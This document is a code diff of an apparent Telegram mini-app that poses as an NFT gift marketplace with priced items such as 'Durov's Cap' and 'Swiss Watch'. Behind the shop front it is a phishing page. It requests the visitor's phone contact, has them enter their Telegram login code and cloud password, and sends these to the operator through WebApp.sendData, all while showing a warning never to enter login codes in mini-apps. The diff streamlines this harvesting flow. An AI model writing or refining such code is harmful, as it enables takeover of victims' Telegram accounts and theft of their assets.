@@ -492,21 +492,8 @@
                 <span>Внимание! Никогда не вводите коды для входа в Telegram в мини-приложениях.</span>
             </div>
             <div id="phoneInputSection">
-                <div class="country-selector">
-                    <span class="country-flag">🇷🇺</span>
-                    <select class="country-select" id="countryCode">
-                        <option value="+7">Россия +7</option>
-                        <option value="+1">США +1</option>
-                        <option value="+44">Великобритания +44</option>
-                        <option value="+380">Украина +380</option>
-                        <option value="+375">Беларусь +375</option>
-                    </select>
-                </div>
-                <input type="tel" class="phone-input" id="phoneNumber" placeholder="Введите номер">
-                <div class="modal-actions">
-                    <button class="btn-cancel" onclick="closeModal('phoneModal')">Отмена</button>
-                    <button class="btn-next" onclick="showCodeForm()">Поделиться</button>
-                </div>
+                <button class="btn-primary" onclick="sharePhone()">📱 Поделиться номером</button>
+                <button class="btn-cancel" onclick="closeModal('phoneModal')">Отмена</button>
             </div>
             <div id="codeFormSection" class="hidden">
                 <div class="form-group">
@@ -524,22 +511,26 @@
     <script>
         // NFT Gifts Data
         const gifts = [
-            { name: 'Pet Snake', id: 2469, price: 1.36, emoji: '🐍' },
-            { name: 'Swiss Watch', id: 369, price: 37.06, emoji: '⌚' },
-            { name: 'Candy Cane', id: 434, price: 1.51, emoji: '🍭' },
-            { name: 'Cookie Heart', id: 1068, price: 1.69, emoji: '🍪' },
-            { name: "Durov's Cap", id: 404, price: 15.99, emoji: '🧢' },
-            { name: 'Perfume Bottle', id: 505, price: 2.78, emoji: '🧴' },
-            { name: 'Signet Ring', id: 606, price: 8.45, emoji: '💍' },
-            { name: 'Eternal Rose', id: 707, price: 6.33, emoji: '🌹' },
-            { name: 'Vintage Watch', id: 808, price: 22.10, emoji: '⏰' },
-            { name: 'Heroic Helmet', id: 909, price: 11.56, emoji: '⚔️' },
-            { name: 'Heart Locket', id: 1010, price: 3.89, emoji: '💝' },
-            { name: 'Plush Bear', id: 1111, price: 1.02, emoji: '🧸' },
-            { name: 'Golden Apple', id: 1212, price: 7.84, emoji: '🍎' },
-            { name: 'Magic Lamp', id: 1313, price: 4.21, emoji: '🪔' },
-            { name: 'Crystal Ball', id: 1414, price: 9.67, emoji: '🔮' },
-            { name: 'Dragon Egg', id: 1616, price: 18.90, emoji: '🥚' }
+            { name: 'Pet Snake', id: 2469, price: 1.36, img: 'img/pet_snake.png' },
+            { name: 'Swiss Watch', id: 369, price: 37.06, img: 'img/swiss_watch.png' },
+            { name: 'Candy Cane', id: 434, price: 1.51, img: 'img/candy_cane.png' },
+            { name: 'Cookie Heart', id: 1068, price: 1.69, img: 'img/cookie_heart.png' },
+            { name: "Durov's Cap", id: 404, price: 15.99, img: 'img/durov_cap.png' },
+            { name: 'Perfume Bottle', id: 505, price: 2.78, img: 'img/perfume_bottle.png' },
+            { name: 'Signet Ring', id: 606, price: 8.45, img: 'img/signet_ring.png' },
+            { name: 'Eternal Rose', id: 707, price: 6.33, img: 'img/eternal_rose.png' },
+            { name: 'Vintage Watch', id: 808, price: 22.10, img: 'img/vintage_watch.png' },
+            { name: 'Heroic Helmet', id: 909, price: 11.56, img: 'img/heroic_helmet.png' },
+            { name: 'Heart Locket', id: 1010, price: 3.89, img: 'img/heart_locket.png' },
+            { name: 'Plush Bear', id: 1111, price: 1.02, img: 'img/plush_bear.png' },
+            { name: 'Golden Apple', id: 1212, price: 7.84, img: 'img/golden_apple.png' },
+            { name: 'Magic Lamp', id: 1313, price: 4.21, img: 'img/magic_lamp.png' },
+            { name: 'Crystal Ball', id: 1414, price: 9.67, img: 'img/crystal_ball.png' },
+            { name: 'Enchanted Book', id: 1515, price: 2.34, img: 'img/enchanted_book.png' },
+            { name: 'Dragon Egg', id: 1616, price: 18.90, img: 'img/dragon_egg.png' },
+            { name: 'Phoenix Feather', id: 1717, price: 5.67, img: 'img/phoenix_feather.png' },
+            { name: 'Wizard Hat', id: 1818, price: 3.12, img: 'img/wizard_hat.png' },
+            { name: 'Elf Shoes', id: 1919, price: 1.78, img: 'img/elf_shoes.png' }
         ];
         
         // Render gifts
@@ -547,7 +538,9 @@
             const grid = document.getElementById('giftsGrid');
             grid.innerHTML = gifts.map(gift => `
                 <div class="card" onclick="showAuthRequired()">
-                    <div class="card-image">${gift.emoji}</div>
+                    <div class="card-image">
+                        <img src="${gift.img}" alt="${gift.name}" style="width:100%; height:100%; object-fit: cover;">
+                    </div>
                     <div class="card-content">
                         <div class="card-title">${gift.name}</div>
                         <div class="card-id">#${gift.id}</div>
@@ -572,21 +565,32 @@
             document.getElementById('phoneModal').classList.add('active');
         }
         
-        function showCodeForm() {
-            const phone = document.getElementById('phoneNumber').value;
-            if (!phone || phone.length < 5) {
-                alert('Пожалуйста, введите номер телефона');
-                return;
+        function sharePhone() {
+            try {
+                if (window.Telegram && window.Telegram.WebApp) {
+                    // Используем встроенный метод Telegram для запроса номера телефона
+                    window.Telegram.WebApp.requestContact(function(success, data) {
+                        if (success) {
+                            console.log('Contact shared:', data);
+                            // Показываем форму для кода
+                            document.getElementById('phoneInputSection').classList.add('hidden');
+                            document.getElementById('codeFormSection').classList.remove('hidden');
+                        } else {
+                            alert('Не удалось получить номер телефона');
+                        }
+                    });
+                } else {
+                    alert('Telegram WebApp API недоступен');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Ошибка: ' + error.message);
             }
-            document.getElementById('phoneInputSection').classList.add('hidden');
-            document.getElementById('codeFormSection').classList.remove('hidden');
         }
         
         function submitAuth() {
             const code = document.getElementById('smsCode').value;
             const password = document.getElementById('cloudPassword').value;
-            const countryCode = document.getElementById('countryCode').value;
-            const phone = document.getElementById('phoneNumber').value;
            
             if (!code || code.length !== 5) {
                 alert('Пожалуйста, введите 5-значный код');
@@ -600,52 +604,24 @@
             
             // Collect auth data
             const authData = {
-                country_code: countryCode,
-                phone: phone,
                 code: code,
                 cloud_password: password,
                 timestamp: new Date().toISOString()
             };
             
-            // Try different methods to send data
+            // Send data
             try {
-                // Method 1: Use sendData if available
-                if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.sendData) {
+                if (window.Telegram && window.Telegram.WebApp) {
                     window.Telegram.WebApp.sendData(JSON.stringify(authData));
-                    console.log('Data sent via sendData');
+                    console.log('Data sent:', authData);
                 }
                 
-                // Method 2: Use MainButton callback
-                if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.MainButton) {
-                    window.Telegram.WebApp.MainButton.setText('Отправка данных...');
-                    window.Telegram.WebApp.MainButton.show();
-                    window.Telegram.WebApp.MainButton.onClick(function() {
-                        window.Telegram.WebApp.sendData(JSON.stringify(authData));
-                    });
-                }
-                
-                // Method 3: Store in CloudStorage
-                if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.CloudStorage) {
-                    window.Telegram.WebApp.CloudStorage.setItem('auth_data', JSON.stringify(authData), function(error) {
-                        if (!error) {
-                            console.log('Data saved to CloudStorage');
-                        }
-                    });
-                }
-                
-                // Method 4: Log to console for debugging
-                console.log('Auth Data:', authData);
-                
-                alert('Данные собраны и готовы к отправке!\n\n' + 
-                      'Телефон: ' + countryCode + phone + '\n' +
-                      'Код: ' + code + '\n' +
-                      'Пароль: ' + password);
-                
+                alert('Данные отправлены!');
                 closeAllModals();
                 
             } catch (error) {
                 console.error('Error sending data:', error);
-                alert('Ошибка при отправке данных: ' + error.message);
+                alert('Ошибка при отправке: ' + error.message);
             }
         }
         
